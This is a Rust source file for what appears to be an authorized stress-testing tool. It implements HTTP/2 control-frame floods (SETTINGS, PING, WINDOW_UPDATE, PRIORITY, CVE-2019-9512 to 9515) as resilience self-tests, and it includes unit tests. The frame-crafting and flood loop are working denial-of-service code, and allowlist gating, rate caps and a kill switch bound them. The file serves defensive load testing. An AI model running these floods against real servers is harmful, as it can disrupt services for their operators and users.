//! # HTTP/2 control-frame floods (SETTINGS / PING / WINDOW_UPDATE / PRIORITY) —
//! isolated-lab / authorized use.
//!
//! Each primitive opens an HTTP/2 connection and then floods a **control frame**
//! that obliges the server to do work per frame, cheaply, forever:
//!
//!   - **SETTINGS flood** (CVE-2019-9515) — a stream of empty `SETTINGS` frames.
//!     Each non-ACK `SETTINGS` frame the server receives must be applied and
//!     acknowledged with a `SETTINGS` ACK, so the client makes the server emit a
//!     frame (and queue work) for every frame it sends.
//!   - **PING flood** (CVE-2019-9512) — a stream of `PING` frames. Each `PING`
//!     obliges the server to reply with a `PING` ACK (PONG), again turning one
//!     cheap client frame into guaranteed server work + egress.
//!   - **WINDOW_UPDATE flood** (CVE-2019-9514) — a stream of connection-level
//!     `WINDOW_UPDATE` frames (stream 0). Each obliges the server to process a
//!     flow-control credit update; the increment is a fixed, valid non-zero value
//!     so the connection is never torn down for a protocol error.
//!   - **PRIORITY flood** (CVE-2019-9513, "Resource Loop") — a stream of
//!     `PRIORITY` frames. Each reshuffles the server's priority tree, work it must
//!     do even though no request stream is ever opened.
//!
//! None of them uses a request stream, so there is no flow-control credit to
//! exhaust and no stream state to manage — the asymmetry is pure per-frame
//! bookkeeping. jinrai exposes them as resilience self-tests so an operator can
//! measure whether their own stack bounds / rate-limits unsolicited control frames.
//!
//! ## Why raw frames
//!
//! As with [`crate::h2_continuation`], the high-level `h2` crate will not emit a
//! bare flood of control frames, so these are crafted by hand on the byte stream
//! via [`crate::h2_frames`] — std-only, no new dependency, reusing the shared
//! `l7::tls` (ALPN `h2`) config for `https` and prior-knowledge h2c for `http`.
//!
//! ## Same safety boundary as the other L7 engines
//!
//! The URL host is authorized as a **datum** and pinned to a single connect
//! address, so the connection only ever reaches the gate-authorized target. The
//! run is bounded by `duration`, capped by the rate cap (reinterpreted as *frames
//! per second*), and aborts promptly on the kill switch. Direct self-test — no
//! spoofing, no reflection/amplification.

use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::MissedTickBehavior;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::TlsConnector;

use jinrai_core::{Layer, ModuleError, RunPlan, RunReport, StressModule};
use jinrai_safety::{Authorization, AuthorizedTarget, KillSwitch};

use crate::h2_frames::{
    push_frame, FLAG_NONE, PREFACE, TYPE_PING, TYPE_PRIORITY, TYPE_SETTINGS, TYPE_WINDOW_UPDATE,
};
use crate::{authorize_datum, resolve_addrs, wait_for_kill, L7Error};

/// Which control frame to flood.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum H2FrameKind {
    /// Empty `SETTINGS` frames (CVE-2019-9515) — server must apply + ACK each.
    Settings,
    /// `PING` frames (CVE-2019-9512) — server must reply with a PING ACK each.
    Ping,
    /// Connection-level `WINDOW_UPDATE` frames (CVE-2019-9514) — server must
    /// process a flow-control credit update per frame.
    WindowUpdate,
    /// `PRIORITY` frames (CVE-2019-9513) — server must reshuffle its priority
    /// tree per frame ("Resource Loop").
    Priority,
}

impl H2FrameKind {
    fn label(self) -> &'static str {
        match self {
            H2FrameKind::Settings => "l7-h2-settings-flood",
            H2FrameKind::Ping => "l7-h2-ping-flood",
            H2FrameKind::WindowUpdate => "l7-h2-window-update-flood",
            H2FrameKind::Priority => "l7-h2-priority-flood",
        }
    }

    /// The already-encoded flood frame for this kind:
    ///   - `SETTINGS`: an empty frame on stream 0.
    ///   - `PING`: an 8-octet opaque payload on stream 0 (RFC 7540 requires PING
    ///     to be exactly 8 bytes).
    ///   - `WINDOW_UPDATE`: a 4-octet window-size increment on stream 0. The
    ///     increment is 1 — a valid, non-zero value (a 0 increment is a protocol
    ///     error that would close the connection), the smallest that still obliges
    ///     the server to process a credit update per frame.
    ///   - `PRIORITY`: a 5-octet payload (4-octet stream dependency + 1-octet
    ///     weight) on stream 1. PRIORITY frames are not allowed on stream 0, so a
    ///     non-zero stream id is required; the frame makes stream 1 depend on the
    ///     connection root (dependency 0) with the minimum weight.
    ///
    /// SETTINGS/PING/WINDOW_UPDATE carry no flags (so no ACK), which is what
    /// obliges the server to act on each frame.
    fn frame(self) -> Vec<u8> {
        let mut f = Vec::with_capacity(9 + 8);
        match self {
            H2FrameKind::Settings => push_frame(&mut f, TYPE_SETTINGS, FLAG_NONE, 0, &[]),
            H2FrameKind::Ping => push_frame(&mut f, TYPE_PING, FLAG_NONE, 0, &[0u8; 8]),
            H2FrameKind::WindowUpdate => {
                push_frame(&mut f, TYPE_WINDOW_UPDATE, FLAG_NONE, 0, &1u32.to_be_bytes())
            }
            H2FrameKind::Priority => {
                // stream dependency (4 bytes, root = 0) + weight (1 byte, 0 => 1).
                push_frame(&mut f, TYPE_PRIORITY, FLAG_NONE, 1, &[0, 0, 0, 0, 0])
            }
        }
        f
    }
}

/// The HTTP/2 control-frame flood engine. Holds a clone of the gate (the sole
/// authority), the target URL, and which frame to flood.
#[derive(Debug, Clone)]
pub struct H2FrameFloodEngine {
    gate: Authorization,
    url: String,
    kind: H2FrameKind,
}

impl H2FrameFloodEngine {
    pub fn new(gate: Authorization, url: impl Into<String>, kind: H2FrameKind) -> Self {
        Self { gate, url: url.into(), kind }
    }

    /// Authorize the datum (public so the CLI can fail-closed before any run).
    pub fn authorize_target(&self) -> Result<Vec<AuthorizedTarget>, L7Error> {
        Ok(vec![authorize_datum(&self.gate, &self.url)?.target])
    }

    fn prepare(&self) -> Result<Prepared, L7Error> {
        let datum = authorize_datum(&self.gate, &self.url)?;
        let addr = resolve_addrs(&datum)?.primary();
        // https => TLS with ALPN "h2"; http => prior-knowledge h2c (no TLS).
        let tls = if datum.url.scheme() == "https" {
            let connector = TlsConnector::from(crate::tls::client_config(vec![b"h2".to_vec()])?);
            Some((connector, crate::tls::server_name(&datum)?))
        } else {
            None
        };
        Ok(Prepared { addr, tls })
    }

    /// This primitive could not start. See [`crate::module_error`] for why the
    /// distinction between a refusal and a setup failure is kept.
    fn refusal(&self, e: L7Error) -> ModuleError {
        crate::module_error(format!("L7 {}", self.kind.label()), e)
    }
}

struct Prepared {
    addr: SocketAddr,
    tls: Option<(TlsConnector, ServerName<'static>)>,
}

impl StressModule for H2FrameFloodEngine {
    fn layer(&self) -> Layer {
        Layer::L7
    }

    fn name(&self) -> &str {
        self.kind.label()
    }

    fn execute(&mut self, plan: &RunPlan) -> Result<RunReport, ModuleError> {
        let Prepared { addr, tls } = match self.prepare() {
            Ok(p) => p,
            Err(e) => return Err(self.refusal(e)),
        };

        // Rate cap: min spacing between frames. `None` => send nothing.
        let Some(interval) = plan.rate_cap.min_interval() else {
            return Ok(RunReport {
                layer_label: format!("L7 {} {} (rate cap 0 — sent nothing)", self.kind.label(), self.url),
                aborted_early: false,
                ..Default::default()
            });
        };

        let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
            Ok(rt) => rt,
            Err(e) => return Err(self.refusal(L7Error::Client(e.to_string()))),
        };

        let sent = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        let sent_w = sent.clone();
        let errors_w = errors.clone();
        let kill = plan.kill.clone();
        let duration = plan.duration;
        let frame = self.kind.frame();

        rt.block_on(async move {
            let deadline = crate::deadline_in(duration);
            let tcp = match tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(addr)).await {
                Ok(Ok(s)) => s,
                _ => {
                    errors_w.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };

            match tls {
                None => drive(tcp, frame, interval, deadline, kill, sent_w, errors_w).await,
                Some((connector, server_name)) => {
                    let handshake =
                        tokio::time::timeout(Duration::from_secs(10), connector.connect(server_name, tcp));
                    let stream = match handshake.await {
                        Ok(Ok(s)) => s,
                        _ => {
                            errors_w.fetch_add(1, Ordering::Relaxed);
                            return;
                        }
                    };
                    // The server must have agreed to HTTP/2 over ALPN, else there
                    // is no h2 framing to flood.
                    if stream.get_ref().1.alpn_protocol() != Some(b"h2") {
                        errors_w.fetch_add(1, Ordering::Relaxed);
                        return;
                    }
                    drive(stream, frame, interval, deadline, kill, sent_w, errors_w).await;
                }
            }
        });

        let aborted = plan.kill.is_tripped();
        let n = sent.load(Ordering::Relaxed);
        Ok(RunReport {
            layer_label: format!(
                "L7 {} {} ({} frame{})",
                self.kind.label(),
                self.url,
                n,
                if n == 1 { "" } else { "s" }
            ),
            units_sent: n,
            errors: errors.load(Ordering::Relaxed),
            aborted_early: aborted,
            ..Default::default()
        })
    }
}

/// Open the connection at the frame level (preface + one empty SETTINGS to satisfy
/// the h2 handshake), then write the pre-encoded flood `frame` repeatedly,
/// rate-capped, until the deadline or kill. Generic over the byte stream so the
/// same loop serves h2c (`TcpStream`) and h2-over-TLS (`TlsStream`).
async fn drive<IO>(
    mut io: IO,
    frame: Vec<u8>,
    interval: Duration,
    deadline: Instant,
    kill: KillSwitch,
    sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) where
    IO: AsyncRead + AsyncWrite + Unpin + Send + 'static,
{
    // Preface + our own empty SETTINGS frame completes the client half of the h2
    // handshake so the server accepts subsequent frames on the connection.
    let mut open = Vec::with_capacity(PREFACE.len() + 9);
    open.extend_from_slice(PREFACE);
    push_frame(&mut open, TYPE_SETTINGS, FLAG_NONE, 0, &[]);
    if io.write_all(&open).await.is_err() {
        errors.fetch_add(1, Ordering::Relaxed);
        return;
    }

    let mut ticker = tokio::time::interval(interval);
    // Never exceed the cap: on a missed tick, delay rather than burst.
    ticker.set_missed_tick_behavior(MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = ticker.tick() => {}
            _ = wait_for_kill(kill.clone()) => break,
        }
        if kill.is_tripped() || Instant::now() >= deadline {
            break;
        }

        // A write failure means the peer tore the connection down (e.g. it
        // rate-limits control frames and closed) or stopped reading altogether —
        // record and stop. The write is raced against the kill switch and the
        // deadline so a peer that never drains cannot outlast either.
        match crate::write_or_stop(&mut io, &frame, &kill, deadline).await {
            crate::FrameWrite::Wrote => {
                sent.fetch_add(1, Ordering::Relaxed);
            }
            crate::FrameWrite::Failed => {
                errors.fetch_add(1, Ordering::Relaxed);
                break;
            }
            crate::FrameWrite::Stopped => break,
        }
    }

    let _ = io.shutdown().await;
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use std::net::TcpListener;
    use std::sync::atomic::AtomicBool;
    use std::sync::Mutex;
    use std::thread;

    use jinrai_core::RateCap;
    use jinrai_safety::{Allowlist, KillSwitch};

    fn gate_cidrs(cidrs: &[&str]) -> Authorization {
        Authorization::new(Allowlist::from_cidrs(cidrs).unwrap(), KillSwitch::new())
    }

    #[test]
    fn authorizes_http_and_https_datums() {
        for url in ["http://127.0.0.1:9/", "https://127.0.0.1:9/"] {
            let engine = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), url, H2FrameKind::Ping);
            assert!(engine.authorize_target().is_ok(), "{url} should authorize");
        }
    }

    #[test]
    fn unauthorized_target_refused() {
        let engine =
            H2FrameFloodEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Settings);
        assert!(engine.authorize_target().is_err());
    }

    #[test]
    fn names_reflect_the_frame_kind() {
        let ping = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Ping);
        let settings =
            H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Settings);
        assert_eq!(ping.name(), "l7-h2-ping-flood");
        assert_eq!(settings.name(), "l7-h2-settings-flood");
        assert_eq!(ping.layer(), Layer::L7);

        let win = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::WindowUpdate);
        let prio = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Priority);
        assert_eq!(win.name(), "l7-h2-window-update-flood");
        assert_eq!(prio.name(), "l7-h2-priority-flood");
    }

    #[test]
    fn ping_frame_is_type_6_len_8_on_stream_0() {
        let f = H2FrameKind::Ping.frame();
        assert_eq!(&f[0..3], &[0, 0, 8], "PING payload must be 8 bytes");
        assert_eq!(f[3], 0x6, "type PING");
        assert_eq!(f[4], 0x0, "no ACK flag (an ACK would not oblige a reply)");
        assert_eq!(&f[5..9], &[0, 0, 0, 0], "stream 0");
        assert_eq!(f.len(), 9 + 8);
    }

    #[test]
    fn settings_frame_is_type_4_empty_on_stream_0() {
        let f = H2FrameKind::Settings.frame();
        assert_eq!(&f[0..3], &[0, 0, 0], "empty SETTINGS payload");
        assert_eq!(f[3], 0x4, "type SETTINGS");
        assert_eq!(f[4], 0x0, "no ACK flag");
        assert_eq!(&f[5..9], &[0, 0, 0, 0], "stream 0");
        assert_eq!(f.len(), 9);
    }

    #[test]
    fn window_update_frame_is_type_8_len_4_nonzero_increment_on_stream_0() {
        let f = H2FrameKind::WindowUpdate.frame();
        assert_eq!(&f[0..3], &[0, 0, 4], "WINDOW_UPDATE payload must be 4 bytes");
        assert_eq!(f[3], 0x8, "type WINDOW_UPDATE");
        assert_eq!(f[4], 0x0, "no flags");
        assert_eq!(&f[5..9], &[0, 0, 0, 0], "connection-level, stream 0");
        assert_ne!(&f[9..13], &[0, 0, 0, 0], "increment must be non-zero (0 is a protocol error)");
        assert_eq!(f.len(), 9 + 4);
    }

    #[test]
    fn priority_frame_is_type_2_len_5_on_a_nonzero_stream() {
        let f = H2FrameKind::Priority.frame();
        assert_eq!(&f[0..3], &[0, 0, 5], "PRIORITY payload must be 5 bytes");
        assert_eq!(f[3], 0x2, "type PRIORITY");
        assert_eq!(f[4], 0x0, "no flags");
        assert_ne!(&f[5..9], &[0, 0, 0, 0], "PRIORITY is illegal on stream 0");
        assert_eq!(f.len(), 9 + 5);
    }

    #[test]
    fn rate_cap_zero_sends_nothing() {
        let mut engine =
            H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Ping);
        let plan = RunPlan {
            targets: engine.authorize_target().unwrap(),
            rate_cap: RateCap::new(0),
            duration: Duration::from_millis(50),
            kill: KillSwitch::new(),
        };
        let report = engine.execute(&plan).expect("the run should execute");
        assert_eq!(report.units_sent, 0);
        assert!(!report.aborted_early);
        assert!(report.layer_label.contains("sent nothing"));
    }

    #[allow(clippy::type_complexity)]
    fn spawn_raw_server() -> (u16, Arc<Mutex<Vec<u8>>>, Arc<AtomicBool>, thread::JoinHandle<()>) {
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        listener.set_nonblocking(true).unwrap();
        let seen = Arc::new(Mutex::new(Vec::<u8>::new()));
        let stop = Arc::new(AtomicBool::new(false));
        let seen_s = seen.clone();
        let stop_s = stop.clone();
        let handle = thread::spawn(move || {
            while !stop_s.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((mut s, _)) => {
                        s.set_read_timeout(Some(Duration::from_millis(100))).unwrap();
                        let mut buf = [0u8; 65536];
                        while !stop_s.load(Ordering::Relaxed) {
                            match s.read(&mut buf) {
                                Ok(0) => break,
                                Ok(n) => seen_s.lock().unwrap().extend_from_slice(&buf[..n]),
                                Err(ref e)
                                    if e.kind() == std::io::ErrorKind::WouldBlock
                                        || e.kind() == std::io::ErrorKind::TimedOut => {}
                                Err(_) => break,
                            }
                        }
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });
        (port, seen, stop, handle)
    }

    #[test]
    fn ping_flood_sends_preface_then_ping_frames() {
        let (port, seen, stop, handle) = spawn_raw_server();
        let url = format!("http://127.0.0.1:{port}/");
        let mut engine = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), &url, H2FrameKind::Ping);
        let plan = RunPlan {
            targets: engine.authorize_target().unwrap(),
            rate_cap: RateCap::new(200),
            duration: Duration::from_millis(400),
            kill: KillSwitch::new(),
        };
        let report = engine.execute(&plan).expect("the run should execute");
        thread::sleep(Duration::from_millis(100));
        stop.store(true, Ordering::Relaxed);
        handle.join().unwrap();

        assert!(report.units_sent > 0, "should have sent PING frames");
        let bytes: Vec<u8> = { seen.lock().unwrap().clone() };
        assert!(bytes.starts_with(PREFACE), "connection must open with the h2 preface");
        assert!(has_frame_of_type(&bytes, TYPE_PING), "server should have seen a PING frame");
    }

    /// Walk the frame stream (after the preface) and report whether any frame has
    /// the given type byte.
    fn has_frame_of_type(bytes: &[u8], ty: u8) -> bool {
        let Some(mut rest) = bytes.strip_prefix(PREFACE) else { return false };
        while rest.len() >= 9 {
            let len = ((rest[0] as usize) << 16) | ((rest[1] as usize) << 8) | rest[2] as usize;
            if rest[3] == ty {
                return true;
            }
            let frame_end = 9 + len;
            if rest.len() < frame_end {
                break;
            }
            rest = &rest[frame_end..];
        }
        false
    }
}
